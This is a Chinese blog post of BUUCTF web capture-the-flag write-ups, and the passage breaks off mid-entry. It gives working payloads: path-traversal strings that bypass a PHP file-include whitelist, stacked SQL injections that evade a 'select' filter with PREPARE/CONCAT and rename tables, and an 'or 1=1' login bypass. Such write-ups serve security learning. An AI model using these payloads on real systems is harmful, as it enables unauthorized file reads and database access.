@@ -1,0 +1,690 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BUUCTF寒假刷题-Web | Braindance</title><meta name="keywords" content="Web"><meta name="author" content="Braindance"><meta name="copyright" content="Braindance"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="寒假横向刷题（尽量） 2021.01.15[HCTF 2018]WarmUp进到靶机一个硕大的滑稽，查看源码有提示source.php  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php    highlight_file(__FILE__);    c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF寒假刷题-Web">
+<meta property="og:url" content="https://braindance.tk/2021/BUUCTF%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-Web/index.html">
+<meta property="og:site_name" content="Braindance">
+<meta property="og:description" content="寒假横向刷题（尽量） 2021.01.15[HCTF 2018]WarmUp进到靶机一个硕大的滑稽，查看源码有提示source.php  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php    highlight_file(__FILE__);    c">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120223242.jpg">
+<meta property="article:published_time" content="2021-01-18T08:58:56.273Z">
+<meta property="article:modified_time" content="2021-01-21T03:29:31.593Z">
+<meta property="article:author" content="Braindance">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120223242.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/other/favicon.png"><link rel="canonical" href="https://braindance.tk/2021/BUUCTF%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-Web/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?283f1b95677b0d1b02cde7fa66532e1f";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.0.2',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"这篇文章距离当时已经","messageNext":"天了，你懂我意思吧。"},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2021-01-21 11:29:31'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="referrer" content="no-referrer-when-downgrade" /><style type="text/css">#toggle-sidebar {bottom: 80px}</style><!-- 音频播放 --><link rel="stylesheet" href="/dist/APlayer.min.css"><div id="aplayer"></div><script type="text/javascript" src="/dist/APlayer.min.js"></script><script type="text/javascript" src="/dist/music.js"></script><meta name="generator" content="Hexo 5.0.2"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/other/qiyu.jpg" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/other/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">24</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">31</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-igloo"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tag"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-book"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-dragon"></i><span> 传送门</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/shuoshuo/"><i class="fa-fw fas fa-star-half"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/guestbook/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-glass-cheers"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-ghost"></i><span> 关于</span></a></div></div></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2021-01-15"><span class="toc-number">1.</span> <span class="toc-text">2021.01.15</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-number">2.</span> <span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-number">4.</span> <span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="toc-number">5.</span> <span class="toc-text">[极客大挑战 2019]Havefun</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-number">6.</span> <span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-number">7.</span> <span class="toc-text">[ACTF2020 新生赛]Include</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-number">8.</span> <span class="toc-text">[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-number">9.</span> <span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2021-01-21"><span class="toc-number">10.</span> <span class="toc-text">2021.01.21</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">11.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-number">12.</span> <span class="toc-text">[ACTF2020 新生赛]Exec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-number">13.</span> <span class="toc-text">[护网杯 2018]easy_tornado</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="toc-number">14.</span> <span class="toc-text">[极客大挑战 2019]Knife</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RoarCTF-2019-Easy-Calc"><span class="toc-number">15.</span> <span class="toc-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="toc-number">16.</span> <span class="toc-text">[极客大挑战 2019]Http</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="toc-number">17.</span> <span class="toc-text">[极客大挑战 2019]PHP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="toc-number">18.</span> <span class="toc-text">[极客大挑战 2019]Upload</span></a></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120223242.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Braindance</a></span><span id="menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-igloo"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tag"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-book"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-dragon"></i><span> 传送门</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/shuoshuo/"><i class="fa-fw fas fa-star-half"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/guestbook/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-glass-cheers"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-ghost"></i><span> 关于</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">BUUCTF寒假刷题-Web</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2021-01-18T08:58:56.273Z" title="undefined 2021-01-18 16:58:56">2021-01-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2021/BUUCTF%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-Web/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count comment-count" data-xid="/2021/BUUCTF%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-Web/" itemprop="commentCount"></span></a></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><p>寒假横向刷题（尽量）</p>
+<h1 id="2021-01-15"><a href="#2021-01-15" class="headerlink" title="2021.01.15"></a>2021.01.15</h1><h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>进到靶机一个硕大的滑稽，查看源码有提示source.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101413.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现白名单有source.php和hint.php，先去查看一下hint.php</p>
+<blockquote>
+<p>flag not here, and flag in ffffllllaaaagggg</p>
+</blockquote>
+<p>分析源码</p>
+<ul>
+<li>判断<code>$_REQUEST[&#39;file&#39;]</code>对象为空且为字符串</li>
+<li>执行emmm类中的<strong>checkFile</strong>方法判断是否在白名单（确保函数返回是true）</li>
+<li>文件包含</li>
+</ul>
+<p>checkFile函数中字符串截取判断是否在白名单（代码17-24和26-34）所以有两种绕过方法。</p>
+<ol>
+<li>第一种</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<p>字符串截取将原字符串尾部加上<code>?</code>再截取第一个<code>?</code>之前的内容。所以需要在构造payload时问号前需要是白名单里的文件。问号之后，猜测flag位置在根目录下，所以使用尽可能多的<code>../</code>返回上级目录。</p>
+<ol start="2">
+<li>第二种</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint.php%3F..%2F..%2F..%2F..%2F..%2Fffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<p>将第一种payload使用urlencode编码即可。</p>
+<hr>
+<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120094248.png"></p>
+<p>根据题目尝试sql注入，单引号报错，单引号加注释无报错，说明存在sql注入，当测试输入select时返回过滤的黑名单：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;&#x2F;select|update|delete|drop|insert|where|\.&#x2F;i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+
+<p>这道题使用的是堆叠注入，原理</p>
+<blockquote>
+<p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+</blockquote>
+<p>查看数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show databases;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095211.png"></p>
+<p>查看当前库下的表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show tables;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095339.png"></p>
+<p>查看两张表字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show columns from words;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095607.png"></p>
+<p>还有一种查看表的语句，在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;desc &#96;1919810931114514&#96;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095839.png"></p>
+<p>找到了flag在的字段，接下来就是如何获取该字段的值。顺带一提，根据表的结构，初步判断默认查询的是<strong>word</strong>表中的字段，而flag在<strong>1919810931114514</strong>表中。</p>
+<p>网上找到的两种方法，分别是修改表名和使用预处理语句。</p>
+<ol>
+<li>使用<a target="_blank" rel="noopener" href="https://www.cnblogs.com/geaozhang/p/9891338.html">预处理</a>语句</li>
+</ol>
+<p>因为select被过滤了，但是可以使用char函数，char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char(115,101,108,101,99,116)</span><br></pre></td></tr></table></figure>
+
+<p>根据预处理语句格式构造payload</p>
+<ul>
+<li>创建一个<strong>sqli</strong>字符串值为查询sql语句，使用预处理语句赋值并执行。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;SET @sqli&#x3D;concat(char(115,101,108,101,99,116),&#39;* from &#96;1919810931114514&#96;&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>不使用变量</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;PREPARE sqli FROM CONCAT(&#39;s&#39;,&#39;elect&#39;,&#39; * from &#96;1919810931114514&#96;&#39;);EXECUTE sqli; #</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>还有一种</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;SET @sqli &#x3D; CONCAT(&#39;s&#39;,&#39;e&#39;,&#39;l&#39;,&#39;e&#39;,&#39;c&#39;,&#39;t&#39;,&#39; * from &#96;1919810931114514&#96;&#39;);PREPARE haha FROM@sqli ;EXECUTE haha; #</span><br></pre></td></tr></table></figure>
+
+<p>主要区别在于过滤的绕过方式，不要拘泥于一种方式。</p>
+<ol start="2">
+<li>修改表名</li>
+</ol>
+<p>修改表名的思路是：默认查询的是<strong>word</strong>表第一个字段，所以把<strong>word</strong>表修改为其他名称，将flag所在的<strong>1919810931114514</strong>表名修改为<strong>word</strong>。</p>
+<p>网上payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39;;rename table words to words1;rename table &#96;1919810931114514&#96; to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</span><br></pre></td></tr></table></figure>
+
+<p>自己构造的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39;;rename table words to words1;rename table &#96;1919810931114514&#96; to words;alter table words change flag id varchar(100) #</span><br></pre></td></tr></table></figure>
+
+<p>之后执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure>
+
+<p>查询表所有字段值即可。</p>
+<hr>
+<h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101528.png"></p>
+<p>用户名密码，尝试万能密码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;or 1&#x3D;1 #</span><br><span class="line">随便密码</span><br></pre></td></tr></table></figure>
+
+<p>一个万能密码的参考:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pass-A/p/11134988.html">https://www.cnblogs.com/pass-A/p/11134988.html</a></p>
+<hr>
+<h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101733.png"></p>
+<p>直接源码找到php代码。payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cat&#x3D;dog</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120102317.png"></p>
+<p>单引号无报错，尝试堆叠注入可以回显。</p>
+<p>和 [强网杯 2019]随便注这道题一样查库查表查字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;show databases;</span><br><span class="line">1;show tables;</span><br></pre></td></tr></table></figure>
+
+<p>但是执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;desc &#96;Flag&#96;;</span><br><span class="line">1;show columns from Flag;</span><br></pre></td></tr></table></figure>
+
+<p>返回了”Nonono.“测试出被过滤了：desc、from、Flag。</p>
+<p>接下来的都是抄网上的预期解也是第一次见。</p>
+<p>比赛时源码泄露</p>
